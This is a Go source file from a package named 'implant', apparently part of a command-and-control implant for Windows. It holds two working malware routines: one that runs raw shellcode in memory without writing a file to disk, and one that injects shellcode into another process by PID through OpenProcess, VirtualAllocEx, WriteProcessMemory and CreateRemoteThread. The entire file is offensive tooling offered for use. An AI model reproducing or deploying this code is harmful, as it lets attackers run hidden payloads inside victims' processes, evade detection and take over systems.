//go:build windows

package implant

import (
	"fmt"
	"syscall"
	"unsafe"
)

var (
	procVirtualAllocEx  = kernel32.NewProc("VirtualAllocEx")
	procVirtualProtect  = kernel32.NewProc("VirtualProtect")
	procCreateThread    = kernel32.NewProc("CreateThread")
	procWaitForSingle   = kernel32.NewProc("WaitForSingleObject")
	procRtlCopyMemory   = ntdll.NewProc("RtlCopyMemory")
)

// ExecuteShellcodeWindows executes raw shellcode in the current process memory.
// Uses VirtualAlloc + RtlCopyMemory + CreateThread.
// No file is created on disk.
func ExecuteShellcodeWindows(shellcode []byte) error {
	if len(shellcode) == 0 {
		return fmt.Errorf("empty shellcode")
	}

	// Allocate RW memory
	addr, _, err := procVirtualAlloc.Call(
		0,
		uintptr(len(shellcode)),
		MEM_COMMIT|MEM_RESERVE,
		PAGE_READWRITE,
	)
	if addr == 0 {
		return fmt.Errorf("VirtualAlloc failed: %w", err)
	}

	// Copy shellcode to allocated memory
	procRtlCopyMemory.Call(
		addr,
		uintptr(unsafe.Pointer(&shellcode[0])),
		uintptr(len(shellcode)),
	)

	// Change memory protection to RX (remove write, add execute)
	var oldProtect uint32
	procVirtualProtect.Call(
		addr,
		uintptr(len(shellcode)),
		syscall.PAGE_EXECUTE_READ,
		uintptr(unsafe.Pointer(&oldProtect)),
	)

	// Create thread at shellcode address
	threadHandle, _, err := procCreateThread.Call(
		0,
		0,
		addr,
		0,
		0,
		0,
	)
	if threadHandle == 0 {
		return fmt.Errorf("CreateThread failed: %w", err)
	}

	// Wait for thread to complete
	procWaitForSingle.Call(threadHandle, 0xFFFFFFFF) // INFINITE

	return nil
}

// InjectShellcodeRemote injects shellcode into a remote process.
// Uses OpenProcess + VirtualAllocEx + WriteProcessMemory + CreateRemoteThread.
// Classic process injection technique.
func InjectShellcodeRemote(pid uint32, shellcode []byte) error {
	if len(shellcode) == 0 {
		return fmt.Errorf("empty shellcode")
	}

	procOpenProcess := kernel32.NewProc("OpenProcess")
	procWriteMemory := kernel32.NewProc("WriteProcessMemory")
	procCreateRemoteThread := kernel32.NewProc("CreateRemoteThread")

	const PROCESS_ALL_ACCESS = 0x001F0FFF

	// Open target process
	handle, _, err := procOpenProcess.Call(
		PROCESS_ALL_ACCESS,
		0,
		uintptr(pid),
	)
	if handle == 0 {
		return fmt.Errorf("OpenProcess(%d) failed: %w", pid, err)
	}
	defer syscall.CloseHandle(syscall.Handle(handle))

	// Allocate memory in target process
	remoteAddr, _, err := procVirtualAllocEx.Call(
		handle,
		0,
		uintptr(len(shellcode)),
		MEM_COMMIT|MEM_RESERVE,
		PAGE_EXECUTE_READWRITE,
	)
	if remoteAddr == 0 {
		return fmt.Errorf("VirtualAllocEx failed: %w", err)
	}

	// Write shellcode to remote process
	var written uintptr
	ret, _, err := procWriteMemory.Call(
		handle,
		remoteAddr,
		uintptr(unsafe.Pointer(&shellcode[0])),
		uintptr(len(shellcode)),
		uintptr(unsafe.Pointer(&written)),
	)
	if ret == 0 {
		return fmt.Errorf("WriteProcessMemory failed: %w", err)
	}

	// Create remote thread to execute shellcode
	threadHandle, _, err := procCreateRemoteThread.Call(
		handle,
		0,
		0,
		remoteAddr,
		0,
		0,
		0,
	)
	if threadHandle == 0 {
		return fmt.Errorf("CreateRemoteThread failed: %w", err)
	}

	syscall.CloseHandle(syscall.Handle(threadHandle))
	return nil
}
